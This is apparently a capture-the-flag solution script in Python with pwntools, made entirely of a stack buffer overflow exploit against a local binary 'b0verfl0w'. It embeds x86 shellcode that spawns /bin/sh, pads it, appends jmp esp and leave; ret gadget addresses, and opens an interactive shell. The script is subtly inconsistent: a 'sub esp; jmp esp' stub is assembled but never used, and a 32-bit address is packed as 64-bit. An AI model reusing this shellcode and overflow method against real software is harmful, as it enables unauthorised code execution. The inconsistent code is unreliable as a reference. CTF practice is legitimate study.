#! /usr/bin/python

from pwn import *

p = process('./b0verfl0w')
elf = ELF('./b0verfl0w')

shellcode_x86  = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode_x86 += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode_x86 += "\x0b\xcd\x80"

#print len(shellcode_x86) = 21

leave_ret = 0x08048468
jmp_esp = 0x08048504
sub_jmp = asm('sub esp,0x28;jmp esp')

payload = shellcode_x86
payload = payload.ljust(0x20,'A')#padding and fake ebp
payload+= p32(jmp_esp) + p64(leave_ret)

p.recvuntil("What's your name?")
p.sendline(payload)

p.interactive()
